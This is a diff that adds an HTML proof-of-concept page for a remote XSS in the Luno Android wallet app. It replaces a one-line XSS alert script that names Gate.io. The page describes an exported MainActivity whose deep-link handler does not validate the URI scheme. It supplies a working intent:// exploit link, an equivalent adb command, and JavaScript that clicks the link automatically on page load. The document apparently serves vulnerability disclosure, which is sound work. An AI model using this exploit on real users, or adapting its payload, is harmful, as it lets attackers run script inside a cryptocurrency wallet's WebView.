@@ -1,1 +1,76 @@
-<script>alert("XSS in Gateio");</script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Luno PoC — Remote XSS via MainActivity deep link</title>
+<style>
+  body{font-family:-apple-system,Roboto,Helvetica,Arial,sans-serif;max-width:760px;margin:40px auto;padding:0 16px;color:#111;line-height:1.5}
+  h1{font-size:22px}
+  code,pre{background:#f4f4f4;border-radius:4px;padding:2px 6px;font-size:13px;word-break:break-all}
+  pre{padding:12px;overflow:auto}
+  .btn{display:inline-block;background:#0a66c2;color:#fff;padding:14px 22px;border-radius:6px;text-decoration:none;font-weight:600;margin:12px 0}
+  .small{color:#555;font-size:13px}
+</style>
+</head>
+<body>
+  <h1>Luno Wallet — Remote XSS PoC</h1>
+  <p>
+    The Luno Android app exposes <code>co.bitx.android.wallet.app.MainActivity</code>
+    with <code>android:exported="true"</code>. The handler in <code>m4044I()</code>
+    validates the URI <em>host</em> (<code>*.luno.com</code>) and <em>path</em>
+    (<code>/daily-briefing</code>) but does <strong>not</strong> validate the
+    <em>scheme</em>. The raw URI is then loaded into a <code>WebView</code>, so a
+    <code>javascript:</code> URI executes attacker-controlled JS inside the app.
+  </p>
+
+  <p>Tap the button below from an Android device with the Luno app installed:</p>
+
+  <p>
+    <!-- Primary trigger: Chrome intent:// URI scoped to the vulnerable activity -->
+    <a class="btn"
+       id="trigger"
+       href="intent://luno.com/daily-briefing?%0aalert(document.domain)#Intent;scheme=javascript;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=co.bitx.android.wallet;component=co.bitx.android.wallet/co.bitx.android.wallet.app.MainActivity;end">
+      Launch PoC (open in Luno)
+    </a>
+  </p>
+
+  <h3>Intent URI used</h3>
+<pre>intent://luno.com/daily-briefing?%0aalert(document.domain)#Intent;
+  scheme=javascript;
+  action=android.intent.action.VIEW;
+  category=android.intent.category.BROWSABLE;
+  package=co.bitx.android.wallet;
+  component=co.bitx.android.wallet/co.bitx.android.wallet.app.MainActivity;
+end</pre>
+
+  <h3>Equivalent ADB command</h3>
+<pre>adb shell "am start -n co.bitx.android.wallet/co.bitx.android.wallet.app.MainActivity \
+  -a android.intent.action.VIEW \
+  -d 'javascript://luno.com/daily-briefing?%0aalert(1)'"</pre>
+
+  <h3>Auto-trigger fallback</h3>
+  <p class="small">
+    Some browsers require a user gesture; the link above provides it. The
+    script below also attempts automatic navigation for browsers that allow it
+    (e.g. WebViews / in-app browsers).
+  </p>
+
+<script>
+  // Attempt automatic trigger ~1s after load (works in many in-app browsers).
+  window.addEventListener('load', function () {
+    setTimeout(function () {
+      try { document.getElementById('trigger').click(); } catch (e) {}
+    }, 1000);
+  });
+</script>
+
+  <hr>
+  <p class="small">
+    Expected result: Luno app opens, the in-app WebView loads the
+    <code>javascript:</code> URI, and <code>alert(document.domain)</code>
+    executes inside the WebView context — confirming remote, no-privilege XSS
+    against any user who taps a malicious link.
+  </p>
+</body>
+</html>
